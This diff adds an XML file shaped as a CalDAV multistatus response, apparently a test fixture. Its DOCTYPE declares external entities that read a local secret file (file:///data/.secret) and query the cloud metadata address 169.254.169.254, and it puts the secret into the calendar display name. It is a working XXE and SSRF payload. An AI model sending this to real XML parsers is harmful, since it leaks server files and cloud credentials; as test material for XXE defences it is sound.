@@ -1,0 +1,17 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE multistatus [
+  <!ENTITY xxe SYSTEM "file:///data/.secret">
+  <!ENTITY pin SYSTEM "http://169.254.169.254/latest/meta-data/">
+]>
+<d:multistatus xmlns:d="DAV:" xmlns:cal="urn:ietf:params:xml:ns:caldav">
+ <d:response>
+  <d:href>/dav/calendars/REDACTED/personal/</d:href>
+  <d:propstat>
+   <d:prop>
+    <d:resourcetype><d:collection/><cal:calendar/></d:resourcetype>
+    <d:displayname>&xxe;</d:displayname>
+   </d:prop>
+   <d:status>HTTP/1.1 200 OK</d:status>
+  </d:propstat>
+ </d:response>
+</d:multistatus>
